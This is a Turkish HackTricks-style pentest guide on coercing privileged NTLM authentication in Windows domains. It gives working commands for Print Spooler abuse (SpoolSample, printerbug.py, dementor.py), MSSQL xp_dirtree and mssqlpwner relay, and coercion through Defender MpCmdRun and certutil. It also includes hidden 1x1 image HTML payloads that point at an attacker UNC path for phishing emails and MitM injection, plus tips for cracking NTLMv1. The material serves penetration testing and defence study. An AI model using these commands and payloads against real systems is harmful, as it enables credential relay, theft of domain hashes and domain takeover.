# NTLM Ayrıcalıklı Kimlik Doğrulamasını Zorla

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) , 3. parti bağımlılıkları önlemek için MIDL derleyicisi kullanılarak C# ile kodlanmış **uzaktan kimlik doğrulama tetikleyicileri** **koleksiyonu**dur.

## Spooler Servisi İstismarı

Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi'nin yazıcı sunucusuna yeni yazdırma işleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.

### Alan üzerindeki Windows Sunucularını Bulma

PowerShell kullanarak, Windows kutularının bir listesini alın. Sunucular genellikle önceliklidir, bu yüzden oraya odaklanalım:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler hizmetlerini dinleyenleri bulma

Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'un) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak, Spooler Hizmetinin dinleyip dinlemediğini kontrol edin:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Linux'te rpcdump.py kullanabilir ve MS-RPRN Protokolü'nü arayabilirsiniz.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Servisten rastgele bir ana bilgisayara karşı kimlik doğrulaması yapmasını isteyin

[ **SpoolSample'ı buradan**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** derleyebilirsiniz.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ve [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın eğer Linux'taysanız
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegation ile Birleştirme

Eğer bir saldırgan [Unconstrained Delegation](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Unconstrained delegation nedeniyle, **yazıcının bilgisayar hesabının TGT'si** unconstrained delegation ile bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu hostu zaten ele geçirdiği için, **bu bileti alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).

## RCP Zorla Kimlik Doğrulama

{{#ref}}
https://github.com/p0dalirius/Coercer
{{#endref}}

## PrivExchange

`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, herhangi bir posta kutusuna sahip alan kullanıcısının Exchange sunucusunu HTTP üzerinden herhangi bir istemci sağlanan hosta kimlik doğrulaması yapmaya zorlamasına olanak tanır.

Varsayılan olarak, **Exchange servisi SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019'dan önceki Kümülatif Güncelleme üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ye bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için sömürülebilir. LDAP'ye iletim mümkün olmadığında bile, bu hata alan içindeki diğer hostlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde sömürülmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.

## Windows İçinde

Eğer zaten Windows makinesinin içindeyseniz, Windows'u ayrıcalıklı hesaplarla bir sunucuya bağlanmaya zorlayabilirsiniz:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ya da bu diğer tekniği kullanın: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

NTLM kimlik doğrulamasını zorlamak için certutil.exe lolbin (Microsoft imzalı ikili) kullanmak mümkündür:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML enjeksiyonu

### E-posta ile

Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona sadece **1x1 piksel boyutunda bir resim içeren bir e-posta** gönderebilirsiniz.
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
ve açtığında, kimlik doğrulamaya çalışacaktır.

### MitM

Eğer bir bilgisayara MitM saldırısı gerçekleştirebilirseniz ve onun göreceği bir sayfaya HTML enjekte ederseniz, sayfaya aşağıdaki gibi bir resim enjekte etmeyi deneyebilirsiniz:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLM kimlik doğrulamasını zorlamak ve oltalama için diğer yollar

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 Kırma

Eğer [NTLMv1 zorluklarını yakalayabilirseniz, bunları nasıl kıracağınızı buradan okuyun](../ntlm/index.html#ntlmv1-attack).\
_NTLMv1'i kırmak için Responder zorluğunu "1122334455667788" olarak ayarlamanız gerektiğini unutmayın._

{{#include ../../banners/hacktricks-training.md}}
